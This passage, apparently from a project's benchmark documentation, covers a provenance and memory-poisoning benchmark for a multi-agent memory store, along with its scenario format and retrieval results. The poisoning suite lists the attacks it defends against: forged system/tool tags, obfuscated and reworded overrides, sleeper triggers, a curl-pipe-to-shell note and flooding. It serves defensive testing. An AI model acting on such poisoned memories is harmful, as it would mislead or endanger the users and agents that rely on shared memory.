# The provenance benchmark (`monomem bench`)

A memory shared by several agents needs more than good search. It needs to say where a fact came from, when,
for whom, and what happens when it is wrong or old, so that one agent cannot quietly turn a weak guess into
shared truth. This benchmark checks that behaviour. It is deterministic, offline, uses no model, and runs on a
throwaway store, so it can gate CI.

```
monomem bench                 # human table; exit 1 if any scenario fails
monomem bench --json          # every scenario, every check, expected vs actual
npm run bench                   # same, from a checkout (builds first)
```

It never touches your own data: it creates a temporary folder, starts a private server on `127.0.0.1` with
random tokens, hides every `MONOMEM_*` setting while it runs, writes its audit log into the temporary
folder, and deletes everything when it ends.

## What it measures

Five suites, written as plain JSON files in [`bench/scenarios/`](https://github.com/calasdan-sketch/monomem/tree/main/bench/scenarios) (they ship in the package).

| Suite | Question | Headline numbers |
|---|---|---|
| **A  Stale memory** | After a fact is updated, replaced or deleted, does search return the current value first and never the old one (or flag it)? | `stale-hit-rate@1`, `stale-hit-rate@5`, `unflagged-stale-hit-rate@5`, `current-recall@1` |
| **B  Contradiction recovery** | Writer A says X, writer B says not-X, a trusted correction arrives. Does the state end up at the correction, does the loser stay visible with its writer, does distrusting the bad writer fix the answer, can a weak writer overwrite a trusted note silently? | resolved to the correction, loser still visible with provenance, weak overwrite protected |
| **C  Permission isolation** | Can tenant B read, write, search, export, import, merge, archive, sweep or learn anything about tenant A? Do tokens do exactly what their scope says? | `leakage-count` (must be 0) and `unexpected-denials` |
| **D  Provenance retention** | After export, import, merge, update, archive, expiry: is every field (source, writer, creator, timestamps, deletion deadline, confidence) still there? | `fields-checked`, `fields-lost`, `fields-kept-only-as-unverified-claim` |
| **E  Memory poisoning** | Do injected or malicious memories ever reach an agent as trusted content? Prompt-injection (plain, forged system/tool tags, zero-width-obfuscated, a booking-policy override) quarantined; a reworded override that passes the gate leaves all four booking answers once its writer is distrusted (E15/E16, adapted from the Agent Memory hygiene demo by elizabethfuentes12, MIT-0); a sleeper trigger or a curl-pipe-to-shell note is stored but comes back with a warning (E17/E18); a distrusted or low-trust writer cannot outrank or silently overwrite a trusted fact; secrets redacted on capture and blocked on write; a forged writer/namespace stamped with the real one; an unsigned import cannot pose as verified; a captured web fetch is not trusted memory; the SessionStart injection carries the untrusted-data banner and leaves distrusted notes out; mass near-duplicate flooding cannot bury the answer. | `poison-reach-count` (must be 0) over the suite's defended probes |

**How the numbers are counted.**

- A "stale hit" is a result whose title or body still carries the old value (or that is the old note), and an
  *unflagged* stale hit is one the system did not mark as stale. `stale-hit-rate@1` is the share of
  queries that name an old value whose first result is stale, `@5` the share with a stale value anywhere in the top five.
  `current-recall@1` is the share of queries (with a current note) where the current note is first. These are
  rates over a small, hand-written set (15 and 14 queries at OneMemory 1.6.0; 14 and 13 at OneMemory 1.5.0): read them as a checklist, not as statistics.
- A scenario passes only if all its checks hold. For stale-memory queries that means: current value first (when
  there is one) and no old value in the top five unless it is flagged stale.
- `leakage-count` is the number of failed attack probes (a cross-tenant read that worked, a secret that
  appeared in a result, a refusal that was not refused). `unexpected-denials` is the number of legitimate
  actions that were refused. Both are counted over the probes written in the scenarios, and the report says how many.
- `fields-lost` counts provenance checks that failed. `fields-kept-only-as-unverified-claim` counts a value that
  survived only as a labelled, unverified claim (what an import does by design with an unsigned export).
- `poison-reach-count` is the number of poison-suite probes (checks tagged `metric: "poison_reach"`) that failed — a poison that
  reached an agent as trusted content. It is counted only over scenarios the suite claims to defend (pass/fail), so a declared
  known gap is reported separately and never adds to it. It must be 0.

## What it does not measure

- **Not retrieval quality.** Search here is keyword search with made-up unique words. There are no embeddings,
  no paraphrases, no relevance judgements. For that, see [Retrieval: LongMemEval-S and LoCoMo](#retrieval-longmemeval-s-and-locomo)
  below and the retrieval evaluation set in `evals/`.
- **Not speed, scale or concurrency.** Each scenario is a handful of calls on an empty store.
- **Not proof of safety.** "0 leaks" means none of the probes written here leaked. It is a regression gate, not
  an audit.
- **A deployed server.** It runs one process on the loopback interface. TLS, proxies and tunnels are not involved.
- **One reading of "provenance".** The scenarios encode one opinion of what a good system does. Another system
  may reasonably choose differently; scenarios are plain JSON so they can be changed or replaced.
- Notes that must look old are placed in the past through the admin import path, so they are stamped with the
  importing admin as writer. The clock is real, so the benchmark never waits.

## Known gaps

A scenario that fails because Monomem genuinely lacks the behaviour is **not hidden and not weakened**. It
carries `"known_gap": "GAP-..."`, and the gap is described in `bench/scenarios/known-gaps.json`. A known gap is
printed in its own section and does not fail the run (use `--strict-gaps` to fail on them). If a marked
scenario starts to pass, the run **fails** with "known gap now PASSES": remove the marker and mark the gap
`fixed`. The current list is in the README's "Benchmark" section.

**OneMemory 1.6.0 closed every gap OneMemory 1.5.0 recorded** (`GAP-SUPERSEDE`, `GAP-RECENCY`, `GAP-HISTORY`, `GAP-CONFIDENCE`, all now `fixed`).
Monomem 1.5.0 (this release) found one more, **`GAP-OBSOLETE-UNREPLACED`** (scenario A33), and fixed it in the same release, so
**no gap is open** and no shipped scenario carries a marker. The gap: when a later note updates a fact in different words and nobody
replaces the old note, keyword search and the "what is relevant" lookup ranked the **old** note first (it matches the query as well and
is shorter, so BM25 scores it higher; newest-first only breaks exact ties). The fix is the restated-twin rule (below, under the
obsolete-fact test): for the same writer, the same subject and a near tie, the newer note now goes first and the old one comes right
behind it, labelled `restated_by`. With the replace step (A34) the old value is gone from all three. Two honest notes on what
"closed" means for the earlier gaps:

- Five of the old gap scenarios (A05, A06, A10, A20, B03) now include the replace steps: the agent *replaces* the old note through
  the two-step preview and confirm. Monomem still does **not** guess that a new note replaces an old one and hide the old one by
  itself; that is a deliberate safety choice (nothing disappears unless a person confirms). Run against the OneMemory 1.5.0 scenario files,
  OneMemory 1.6.0 still returns both notes for those five.
- A11 (a 200-day-old twin) passes through the ranking fix alone, B08 through note history, D10 through the confidence field,
  and B09 through restoring the earlier version after distrusting the overwriter.

## Scenario files

One scenario per file, `bench/scenarios/<ID>-<slug>.json`. `<ID>` is the suite letter (A stale, B contradiction, E poison,
C isolation, D provenance) and a number. Add a file and it runs; no code change.

```json
{
  "id": "A01",
  "suite": "stale",
  "title": "A fact is corrected in place",
  "what": "One or two plain sentences: what this protects against.",
  "actors": { "alice": { "scope": "write" } },
  "steps": [
    { "op": "write",  "as": "alice", "ref": "n", "title": "Deploy region for {{proj}}", "body": "Deploys to {{old}}." },
    { "op": "update", "as": "alice", "ref": "n", "body": "Deploys to {{new}}." },
    { "op": "search", "as": "alice", "q": "{{proj}} deploys", "id": "now" }
  ],
  "expect": [
    { "check": "fresh_answer", "step": "now", "current": "n", "stale_text": ["{{old}}"],
      "desc": "The corrected note is first and nothing carries the old value" }
  ]
}
```

**Top level.** `id`, `suite` (`stale`, `contradiction`, `isolation`, `provenance`, `poison`), `title`, `what`, `actors`,
`steps`, `expect` are required. Optional: `grants` (tenant -> tenants it may also read), `distractors` (N
unrelated notes written first), `needs` (extra capabilities), `settings` (`{"supersede_ttl_seconds": 1}`: a very short confirmation window, for expiry scenarios), `known_gap`, `limit` (a documented limit shown
in the report).

**Placeholders.** `{{name}}` in any string becomes a made-up lowercase word plus two digits, the same every
run for the same `--seed` (default 1), scenario and name. Words are unique per name, so keyword search is never
the thing being tested. Adding a scenario never changes another scenario's words.

**Actors.** `"alice": { "scope": "write", "namespace": "tenantA", "writer": "agentA", "server": "main" }`.
`scope` is `read`, `write` or `admin` (default `write`). `namespace` confines the actor to a tenant. `writer`
is the identity the system should stamp (default: the actor's name). `server` puts the actor on another
instance (default `main`), which is how a note is moved between two servers.

**Steps.** Each step has `op` and `as` (an actor). Results are stored under `id`; `write`, `update`, `delete`,
`archive`, `unarchive`, `read`, `pin`, `confirm`, `merge`, `distrust`, `undistrust` and `trust_server` get the default id
`<op>:<ref>` (or `<op>:<writer>`), so a check can say `"step": "write:n"`.

| `op` | Fields | What it does |
|---|---|---|
| `write` | `ref`, `title`, `body`, `tags`, `source`, `confidence`, `forget_after`, `namespace`, `age_days`, `expires_in_days` | Create a note. `ref` names it for later steps. `age_days` / `expires_in_days` (negative = already past) place it in time (needs `restore`). `namespace` is a claim that a tenant-confined system must ignore. `age_days` and `expires_in_days` go through the admin restore path, so the actor must be an admin (and is then the stamped writer). |
| `update` | `ref`, `title`, `body`, `tags`, `source`, `confidence`, `if_rev_of` | Partial update. `if_rev_of` is the id of an earlier `read` step whose revision is sent as a compare-and-swap guard. |
| `delete`, `archive`, `unarchive`, `read` | `ref` (`read` also `include_distrusted`) | Act on a note. |
| `search` | `q`, `id`, `limit`, `include_distrusted`, `include_superseded`, `namespace` | Search, best first. |
| `supersede_preview` | `id`, `old` (refs), `new_note` (`{title, body, tags, confidence}`) or `new_ref` | Step 1 of a replacement. Must change nothing. Stores the one-time code under `id`. |
| `supersede_confirm` | `id`, `from` (a preview step's id), `new_note`, `acknowledge_risk`, `ref`, `corrupt_code` | Step 2. Uses the code from `from` (the same new text unless `new_note` is given; `corrupt_code` damages the code). `ref` names the replacement note. Run it `as` another actor to test that a code works for nobody else. |
| `supersede_undo` | `ref` | Bring a replaced note back. |
| `confirm` | `ref` | A person confirms the note's current version (needs `confirm`; Monomem: an admin token's confirm, the dashboard's). A confirm that does not count is `invalid`. |
| `history`, `restore_version` | `ref`, `id`; `version`, `if_rev_of` | A note's earlier versions; put one back as a new version. |
| `list`, `recall`, `changes`, `sweep` | `id` | List notes, "what is relevant to this message" (`q`), the change feed, run the expiry sweep. |
| `distrust`, `undistrust` | `writer`, `namespace` | Manage the distrust list. |
| `export`, `import` | `export`: `id`, `attest`. `import`: `from` (an export's id), `id`, `require_attestation`, `tamper` | Move notes between servers. `tamper` changes one field of the payload in transit. |
| `trust_server` | `of` | Make the actor's server believe signatures made by server `of`. |
| `merge` | `refs`, `ref` | Merge duplicate notes into a new one. |
| `capture` | `id`, `event`, `tool`, `input`, `output`, `session`, `namespace` | Record one automatic-memory hook event (a tool output, a web fetch) the way the capture hooks do. The step result's `text` is what was actually persisted after redaction, so a `no_text` / `contains_text` check can prove secrets never reach the capture store. Needs the `capture` capability. |
| `session_start` | `id`, `namespace` | Produce the SessionStart recall injection an agent is handed before its first prompt (the product's own path, so the untrusted-data banner and the distrusted-writer filter are the ones tested). The result's `text` is the injected context. Needs the `session_start` capability. |
| `wait` | `ms` | Pause (rarely needed, at most 2 s). |

**Checks** (`expect`). Every check has a plain-language `desc`, which is what the report prints. Optional
`metric` (`leak`, `unexpected_denial`, `field`, `resolution`, `loser_visible`, `silent_overwrite`, `poison_reach`) feeds the
suite's headline numbers.

| `check` | Passes when |
|---|---|
| `outcome` | step's outcome is `is` (one word or a list): `ok`, `denied`, `not_found`, `conflict`, `invalid`, `quarantined` |
| `top`, `has`, `lacks` | first hit is `ref` / `ref` is among the hits (optionally `within` N) / it is not |
| `fresh_answer` | `current` (a ref) is first, and no hit that is a `stale` ref or contains a `stale_text` string is in the top 5 unless the system flagged it stale |
| `hit_count` | number of hits equals `is`, or is within `min` / `max` |
| `field` | one field (`path`) of a note (`of` a ref, or by exact `title`, else the first) satisfies `equals`, `not_equals`, `includes`, `present`, `same_as` or `differs_from` |
| `no_text` / `contains_text` | a string does not appear / appears (in at least one of `steps`) anywhere in the step's result |
| `same_response` | two refused steps were refused with the same outcome and words (no existence oracle) |
| `recoverable` | `value` is found on the note in `verified_in` (verified) or `claim_in` (an unverified claim; accepted only with `"is": "claim"`) |

Note fields usable in `path`: `id`, `namespace`, `title`, `body`, `tags`, `source`, `writer`, `creator`,
`created_at`, `updated_at`, `expires_at`, `stale`, `distrusted`, `imported_unverified`, `claimed_writer`,
`attested_writer`, `taint`, `confidence`, `status`, `superseded_by`, `rev`. Timestamps are never printed in the report (they would make
two runs differ).

## Adapting another memory system

The engine knows nothing about Monomem. It talks to a `MemoryAdapter`
([`src/bench/types.ts`](https://github.com/calasdan-sketch/monomem/blob/main/src/bench/types.ts)). Implement the four core calls and say which optional ones you
have:

```ts
interface MemoryAdapter {
  readonly name: string;
  readonly capabilities: ReadonlySet<Capability>;   // "read" "list" "restore" "retire" "trust" "export_import"
                                                    // "attestation" "merge" "recall" "changes" "tenants" "cas"
                                                    // "supersede" "history" "capture" "session_start"
  open(world: WorldSpec): Promise<void>;            // fresh empty store + the scenario's actors
  close(): Promise<void>;                           // delete everything; safe to call twice

  write(actor, { title, body, tags?, source?, ... }): Promise<OpResult>;
  update(actor, id, { title?, body?, tags?, source?, if_rev? }): Promise<OpResult>;
  delete(actor, id): Promise<OpResult>;
  search(actor, query, { limit?, include_distrusted?, namespace? }): Promise<OpResult>;
  // optional: read, list, recall, changes, archive, unarchive, sweep, distrust, undistrust,
  //           exportAll, importAll, trustServer, merge, supersedePreview, supersedeConfirm, supersedeUndo,
  //           history, restoreVersion
}
```

"As writer" and "as namespace" are the *actor*: `WorldSpec.actors[name]` carries `{ scope, writer, namespace,
server }`, and every call names the actor it is made as. Return `OpResult { outcome, note?, notes?, hits?, text?,
data? }` where `outcome` is one of `ok`, `denied`, `not_found`, `conflict`, `invalid`, `quarantined`,
`unsupported`, `error`, and notes use the benchmark's field names (`writer`, `creator`, `stale`, `taint`, ...;
leave out the ones your system does not have).

A scenario whose needed operations your adapter lacks is reported **skipped**, never passed. A field your
system does not have simply reads as absent, so a scenario about it fails honestly. Use it from code:

```ts
import { runBench } from "monomem/dist/src/bench/index.js";
const { report } = await runBench({ adapter: new MyAdapter(), suites: ["stale"] });
```

`test/bench.test.ts` contains a short in-memory adapter (`ToyAdapter`) used to prove the engine fails a
system that keeps stale versions or leaks across tenants.

## Using it in CI

```yaml
- run: npm ci
- run: npm run bench       # exit 1 on a failed scenario or a known gap that now passes
```

Exit codes: `0` all good (known gaps are listed but allowed), `1` a scenario failed, a known gap now passes, or
`--strict-gaps` found a gap, `2` bad command line.

## Retrieval: LongMemEval-S and LoCoMo

A second, separate benchmark measures **retrieval only** on two public long-conversation datasets. No LLM
reads anything and no judge grades anything: each conversation is written into a fresh throwaway store, the
question is searched, and the returned sessions (or turns) are compared with the dataset's own gold evidence.

```
monomem bench --longmemeval [--data file] [--limit N] [--mode keyword|hybrid] [--granularity session|turn] [--encrypted] [--split a|b] [--json]
monomem bench --locomo      [--data file] [--limit N] [--mode keyword|hybrid] [--granularity turn|session] [--encrypted] [--split a|b] [--json]
```

- **Data.** LongMemEval-S, cleaned release ([`xiaowu0162/longmemeval-cleaned`](https://huggingface.co/datasets/xiaowu0162/longmemeval-cleaned),
  `longmemeval_s_cleaned.json`, 264 MB) and LoCoMo ([`snap-research/locomo`](https://github.com/snap-research/locomo),
  `data/locomo10.json`). Without `--data` each file is downloaded once to `~/.cache/monomem-bench/`
  (outside the repository) and reused. The file is treated as untrusted data and only `JSON.parse`d.
- **Licences, as the sources state them.** The LongMemEval repository says it is under the MIT licence, and the cleaned dataset
  card on Hugging Face lists MIT. The LoCoMo repository's `LICENSE.txt` is Creative Commons Attribution-NonCommercial 4.0
  International, so check that your use fits before running `--locomo`. Monomem does not ship either dataset (see above); read the
  licence at the source for your case: [LongMemEval](https://github.com/xiaowu0162/LongMemEval), [LoCoMo](https://github.com/snap-research/locomo/blob/main/LICENSE.txt).
- **Isolation.** The command points `MONOMEM_HOME` at a new temporary folder before the configuration
  loads, drops every other `MONOMEM_*` setting except the embedding ones, and refuses to run unless the
  resolved database path is inside that folder. Every haystack gets its own store, deleted afterwards.
- **Indexing.** LongMemEval: one store per question; one note per haystack session (title = session id, body =
  the turns as `role: content` lines), or with `--granularity turn` one note per turn, mapped back to its
  session for scoring. Notes are backdated to `haystack_dates` and written in one transaction, without
  similarity edges and without the write linter. LoCoMo: one store per conversation (all its questions);
  one note per dialog turn (`speaker: text`, plus the image caption when there is one), gold = the
  `evidence` dialog ids; `--granularity session` writes one note per session and scores sessions.
- **Questions.** LongMemEval's 30 abstention questions (`_abs`) have no gold session and are left out: 470 of
  500 are scored. LoCoMo questions with no usable evidence id are left out: 1,982 of 1,986.
- **Three searches are scored.** `keyword` is `runSearch(mode: "keyword")`, the path behind `state_search` and
  `GET /search`: FTS5/BM25 with every word first, then (since 2.0.0) notes matching some of the words, always ranked
  below full matches. `relevant` is `runRelevantSearch` (the `state_relevant` tool and `POST /relevant`): stop words
  dropped, any keyword qualifies, one BM25 OR query scaled by the share of keywords each note contains (before 2026-11-04:
  per-keyword BM25 rankings fused with RRF; the keyword fallback used the same). `--mode hybrid` also scores
  `runSearch(mode: "hybrid")` (BM25 + embeddings; since 2026-11-04 a 0.5 / 0.5 blend of min-max-scaled scores, before
  that RRF) when an embedding server answers; otherwise it is reported as skipped.
- **Metrics.** `R@5`, `R@10`: any gold session (or turn) in the top k. `Rall@5`, `Rall@10`: every gold one in the top 5 / 10
  (strict; `R@k` is the generous any-hit variant). In `--json`: `rAll5`, `rAll10`.
  `nDCG@10` with binary relevance. `MRR` over the top 50. Search latency p50/p95 per query; indexing time per
  haystack (single process, SQLite in a temp folder).

### Results, 2026-11-14 (1.5.0 work; measured, not yet published)

Measured on 2026-11-14 on the development PC: Windows 11 Home, AMD Ryzen 7 9800X3D (8 cores / 16 threads), 31 GB RAM, NVMe,
Node v24.18.0, feat/1.5.0 code. Other build agents were running on the same PC at the same time, so the search times here are
higher than the 2026-11-09 ones (same ranking code) and should be read as "loaded machine", not as a regression. Keyword-only
(no embedding server), the commands exactly as above.

**Strict recall-all@5 (`Rall@5`), new in this round.** `R@5` counts a question as found when any one gold session is in the
top 5; `Rall@5` needs every gold session there. Questions with one gold session score the same on both, so the gap is all in
multi-session questions.

| Run | search | R@5 | **Rall@5** | R@10 | Rall@10 | nDCG@10 | MRR | search p50 / p95 |
|---|---|---|---|---|---|---|---|---|
| LongMemEval-S session (470) | keyword | 96.8 | **84.0** | 98.3 | 90.2 | 89.7 | 91.0 | 5.0 / 34.0 ms |
| LongMemEval-S session (470) | relevant | 96.8 | **84.0** | 98.3 | 90.2 | 89.7 | 90.9 | 3.6 / 16.3 ms |
| LoCoMo-10 turn (1,982) | keyword | 57.8 | **49.8** | 65.2 | 56.2 | 48.0 | 46.6 | 2.6 / 13.2 ms |
| LoCoMo-10 turn (1,982) | relevant | 57.9 | **49.9** | 65.3 | 56.3 | 48.0 | 46.7 | 2.8 / 13.5 ms |
| LoCoMo-10 session (1,982) | keyword | 90.4 | **81.5** | 95.5 | 87.7 | 80.3 | 78.6 | 2.1 / 5.6 ms |
| LoCoMo-10 session (1,982) | relevant | 90.5 | **81.6** | 95.5 | 87.7 | 80.5 | 78.8 | 1.6 / 5.6 ms |

On that run the strict LongMemEval-S figure was 84.0, 0.7 below agentmemory 0.9.31's reported 84.7 (BM25, its own figure, not
re-run here). The next block is the change that closed the gap.

**Search stems and rarity-weighted coverage, 2026-11-15 (round 3, item 4).** Two ranking changes in the any-keyword search,
nothing else: (1) the FTS query uses suffix-trimmed stems, so "camping" also finds "camped" (plural s/es, ed, ing only, at
least 4 letters left, letters-only words); (2) the "share of the question's keywords a note contains" multiplier now weighs each
keyword by how rare it is in the store (idf from the FTS vocabulary; on an encrypted store, from the in-memory body index), so a
note holding the one rare word of a question beats one holding two common ones. Coverage still matches the keywords as typed.

Tuned on half the questions only. `monomem bench ... --split a|b` splits by `sha256(question id)`; every candidate was tried on
half **a**; half **b** never set a parameter, but each candidate that passed **a** was checked on **b** to decide keep or drop
(about 8 checks). So **b** is a validation half, not an untouched test set. Dropped on half a: stem length 5 and 6,
pseudo-relevance feedback at two of three weights. A coverage re-rank changed nothing on either half. Dropped on half b: stems alone (LoCoMo-10 session R@5 -0.4, over the
0.3-point drop guard), pseudo-relevance feedback at the third weight, and idf counted on stems. The kept change sits exactly on
that guard (-0.3, below). Held-out half **b**, keyword: R@5 and
Rall@5 as before / after, the other columns as the change in points:

| Half b | R@5 | **Rall@5** | R@10 | Rall@10 | nDCG@10 | MRR |
|---|---|---|---|---|---|---|
| LongMemEval-S session | 97.1 / 97.5 | **84.9 / 87.0** | +0.4 | +0.8 | +1.6 | +1.4 |
| LoCoMo-10 turn | 56.0 / 58.7 | **47.3 / 49.6** | +1.3 | +1.5 | +1.1 | +1.0 |
| LoCoMo-10 session | 90.2 / 89.9 | **80.9 / 81.3** | 0.0 | +1.1 | +0.7 | +0.6 |

One number went down on the held-out half: LoCoMo-10 session R@5, -0.3 (about 3 of 985 questions). It is reported, not hidden;
on the full set the same metric goes up (90.4 to 90.9).

Full set, measured one run at a time on an otherwise idle PC (2026-11-15, same hardware as above), keyword and relevant:

| Run | search | R@5 | **Rall@5** | R@10 | Rall@10 | nDCG@10 | MRR | search p50 / p95 |
|---|---|---|---|---|---|---|---|---|
| LongMemEval-S session (470) | keyword | 97.2 | **85.7** | 98.7 | 92.1 | 91.0 | 91.8 | 3.9 / 7.7 ms |
| LongMemEval-S session (470) | relevant | 97.2 | **85.7** | 98.7 | 92.1 | 91.0 | 91.7 | 3.1 / 6.0 ms |
| LoCoMo-10 turn (1,982) | keyword | 60.8 | **52.2** | 67.7 | 58.3 | 49.6 | 48.0 | 2.2 / 3.6 ms |
| LoCoMo-10 turn (1,982) | relevant | 60.9 | **52.3** | 67.7 | 58.3 | 49.6 | 48.1 | 2.3 / 3.5 ms |
| LoCoMo-10 session (1,982) | keyword | 90.9 | **82.4** | 96.0 | 89.0 | 81.0 | 79.1 | 1.6 / 2.2 ms |
| LoCoMo-10 session (1,982) | relevant | 91.1 | **82.5** | 96.0 | 88.9 | 81.1 | 79.4 | 1.3 / 1.8 ms |

The honest headline for LongMemEval-S is now **85.7 strict / 97.2 any-hit at k = 5**, keyword-only, no embeddings. That is 1.0
above agentmemory 0.9.31's reported 84.7 (its own figure, not re-run here; we score 470 of the 500 questions, dropping the 30
abstention ones, by session, and did not check that agentmemory's setup matches; 1.0 point is about 5 questions, near the 0.1-0.2
a re-run can move from ties). LoCoMo-10 by turn is still our weakest number.

**Speed at 10,000 notes (`monomem bench --scale 10k`), new in this round.** A synthetic store in a temp folder: 10,000 notes
(10,200 after the timed writes) in 5 namespaces, made-up Zipf-distributed words, bodies 80 % 200-600 characters, 15 % 1.5-3k,
5 % 8-20k (the corpus shape of the round-2 performance seat). Built twice from the same seed: once plain, once with a key file
beside the database (at-rest encryption on). Session start is `injectContext` for one namespace (2,000 notes), 30 runs on an
open store after one warm-up; "open + session start" opens a new `Store` each time (a hook process, minus Node start-up).
Search is a 2-word keyword query in one namespace, 150 runs. Write is `create` with similarity edges and the linter on, 200 runs
on the full store. Three back-to-back runs, ms p50 / p95 (the third run overlapped heavier load from other agents):

| Path | plain, run 1 / 2 / 3 | encrypted, run 1 / 2 / 3 |
|---|---|---|
| Session start (`injectContext`) | 8.8/10.1, 8.7/9.9, 9.8/15.6 | **12.5/15.6, 12.3/17.1, 18.2/42.0** |
| Open store + session start | 23.2/32.2, 23.2/34.8, 24.6/32.8 | 28.6/54.7, 24.9/29.4, 39.3/115.7 |
| Keyword search, 2 words | 6.9/10.4, 6.0/8.7, 6.8/10.4 | 3.3/4.9, 2.9/4.6, 5.7/14.2 (title + tags only: measured before C-06, see below) |
| Write (`create`, edges on) | 5.7/10.7, 5.9/11.7, 6.6/12.3 | 6.0/9.7, 5.7/9.9, 9.0/31.9 |
| Build 10k (one transaction per 1,000, no edges) | 10.8 s, 10.4 s, 10.6 s | 14.0 s, 12.9 s, 25.1 s |

**Release gate (10k encrypted session start p50 < 50 ms): PASS** in all three runs (12.3-18.2 ms; with a fresh store open each
time 24.9-39.3 ms, also under 50). Limits of this measurement: the bulk build skips similarity edges, so the database is 31 MB
instead of the about 57-60 MB the performance seat's fully-edged 10k store had (edges are 43 % of that file); session start does
not read edges, but a smaller file caches better. The time for a whole `monomem recall` hook process (Node start-up included,
657-760 ms in the performance seat's before table) was not re-measured. Encrypted search was faster only because it searched less
text (before C-06; next section has the re-run). 1,000 notes for comparison: session start 5.3 / 8.8 ms plain / encrypted p50.

**Recall with encryption on vs off (`--encrypted`), new in this round.** The same commands with `--encrypted`, which puts a key
file beside every throwaway database before the notes are written; same corpus, same questions, keyword-only. Re-run after the
in-memory body index (C-06, below) was built, 2026-11-15:

| Run | plain R@5 / Rall@5 / R@10 / MRR | encrypted R@5 / Rall@5 / R@10 / MRR | search p50 plain / encrypted |
|---|---|---|---|
| LongMemEval-S session (470), keyword | 97.2 / 85.7 / 98.7 / 91.8 | **97.2 / 85.7 / 98.7 / 91.8** | 3.9 / 13.6 ms (each haystack has one question, so every encrypted search includes the first-search build) |
| LongMemEval-S session (470), relevant | 97.2 / 85.7 / 98.7 / 91.7 | **97.2 / 85.7 / 98.7 / 91.7** | 3.1 / 4.1 ms |
| LoCoMo-10 turn (1,982), keyword | 60.8 / 52.2 / 67.7 / 48.0 | **60.8 / 52.2 / 67.7 / 48.0** | 2.2 / 3.3 ms |
| LoCoMo-10 session (1,982), keyword | 90.9 / 82.4 / 96.0 / 79.1 | **90.9 / 82.4 / 96.0 / 79.1** | 1.6 / 2.3 ms |

(Re-run 2026-11-15 after the stems and rarity-weighted coverage above; the first C-06 run, before them, was likewise identical
between plain and encrypted at 96.8 / 84.0 / 98.3 / 91.0 on LongMemEval-S.)

Every metric (keyword and relevant, all of R@5, Rall@5, R@10, Rall@10, nDCG@10, MRR, per question type) is **byte-identical**
between the plain and the encrypted run: the index covers every note with its decrypted body, so the bm25 statistics are the
plain store's. Before C-06 the encrypted column read 0.0 / 0.0 / 0.0 / 0.0 (0.1 on LoCoMo turn): the on-disk index holds titles
and tags only, and in these datasets every title is a session id. What this does **not** cover: the session-start hook never
builds the index (time budget), so on an encrypted store the context it adds at session start is still matched on titles,
tags, files and recency, not body words.

**C-06: the in-memory body index, built.** While a key is present, each Monomem process that searches attaches a private
`:memory:` database to its own connection and fills a contentless FTS5 table (same columns, tokenizer and prefix index as
`notes_fts`) with every note's title, decrypted body and tags. The two `notes_fts MATCH` queries read it instead; every
visibility filter stays on the `notes` join. TEMP triggers keep it current for this connection's writes (a decrypt that fails
indexes "" and never aborts the write); other processes' commits are noticed through `PRAGMA data_version` and replayed from
`change_log`, with a full rebuild when the log was trimmed past the last point seen. Servers build it on start-up; the hooks
never do; above 100,000 notes it is not built. Measured with `monomem bench --scale 10k` (synthetic made-up words, a worse case
for index size than real text): build 0.81 s and 0.58 s in two runs, process RSS +31.5 MB and +29.5 MB; session start (hook, no index) 15.3 and 12.4 ms p50 encrypted (10.2 and 10.7 plain),
gate PASS; keyword search on the server store 10.7 and 7.7 ms p50 encrypted vs 9.0 and 8.1 plain; a write 7.8 and 5.9 ms p50 encrypted vs 7.2 and 7.6 plain (one extra decrypt
and FTS insert). The design's scratch prototype measured 7.4 s and about 240 MB at 100,000 notes; not re-measured here. Security:
nothing new on disk, but the words are in RAM for the life of the process and can reach swap, hibernation and crash-dump files
(docs/encryption-retention.md).

**Obsolete-fact test (C-07), new in this round.** arXiv 2610.36308 reports that an outdated statement in the retrieved context
drops answer accuracy from 100 % to 44.6 %. Two provenance scenarios measure it here, in the stale suite: A33 writes a fact and a
later update in different words (10 unrelated notes around them) and does **not** replace the old note; A34 does the same and then
replaces it (preview, confirm). Both check search, the "what is relevant" lookup and the SessionStart injection. Result: **A34
passes** (current value first everywhere, obsolete value absent from all three); **A33 failed and was recorded as a known gap**: the
obsolete note was ranked **first** by both search and the lookup, and the SessionStart text carried the current value but the old
note too. Full `monomem bench` after adding them: 132 passed, 1 known gap (A33), 0 failed; stale-hit-rate@5 2/16, current-recall@1 15/15. (That was the state when A33 was added. The same-writer restatement rule later in 1.5.0 fixed it: 137 passed, 0 known gaps.)

**Restated-twin rule (GAP-OBSOLETE-UNREPLACED fixed, 1.5.0).** The twin pass that keeps a stale note behind its newer twin now
has a second rule. An older note moves to just behind a newer one when **all** of these hold: same namespace, both plain notes; the
newer note was written after the older one last changed; the **same server-stamped writer** (that writer could already edit the old
note in place, so the reorder gives it nothing new); the same subject (a fact key with another value, or a similarity link of at
least 0.6); a near tie (the old score is at most 1.5 times the new one, after boosts and penalties); the newer note is inside the
returned results; the older note is not read clearly more than the newer one. It never moves for a different writer (that is the
dispute label's job: one agent must not bury another's note), behind an unconfirmed note when the older one is confirmed by a person,
or behind a note that is held (unconfirmed outside content, flagged, built on a distrusted writer), replaced or distrusted. Nothing is
dropped: the older note carries `restated_by` and `restated_label` (REST, MCP, the CLI) and an explain line. The similarity bar is
0.6, not the 0.35 first designed: at 0.35, A37 (the same project's build server and API server, written by one writer) reordered;
at 0.5, LoCoMo-10 session (with similarity links built, see below) lost 0.3 points of Rall@5 and Rall@10; at 0.6 nothing moved. A33's
pair sits between 0.6 and 0.7, so A33 passes (seeds 1 to 12), with a thin margin. Scenarios A35 to A38 are the guards: another writer (A35), a person-confirmed note (A36, which needs
the new `confirm` step), another subject (A37), outside content (A38). Full `monomem bench`: 137 passed, 0 known gaps, 0 failed.

**MemoryAgentBench (C-07): skipped, not run.** What its README (github.com/HUST-AI-HYZ/MemoryAgentBench, read 2026-11-14)
says: the accurate-retrieval and FactConsolidation splits are scored by substring match, not by a judge, but the answer that is
scored is written by a reader LLM from the retrieved context, and the setup expects `OPENAI_API_KEY` in a `.env` (Anthropic and
Google keys optional); local models (Ollama, vLLM) are not mentioned. The datasets download from Hugging Face
(`ai-hyz/MemoryAgentBench`), and the environment is a Python 3.10 conda env with torch and the full requirements list. A free
local reader through Ollama on 127.0.0.1:11434 would have been allowed, but (1) the harness does not document a local-model
route, so it would mean patching it, (2) the local Ollama did not answer even an embedding request within 120 s during this
round, and (3) a run with a substituted local reader would not be comparable with the published leaderboard (BM25 60.5 on
accurate retrieval used its authors' hosted reader models). So no MemoryAgentBench number is reported; nothing was sent anywhere.

### Results, 2026-11-09 (expert round 4)

Full runs on one Windows PC with this round's changes: keyword ranking weighs title 5, tags 2, body 1 (`bm25(notes_fts, 5, 1, 2)`),
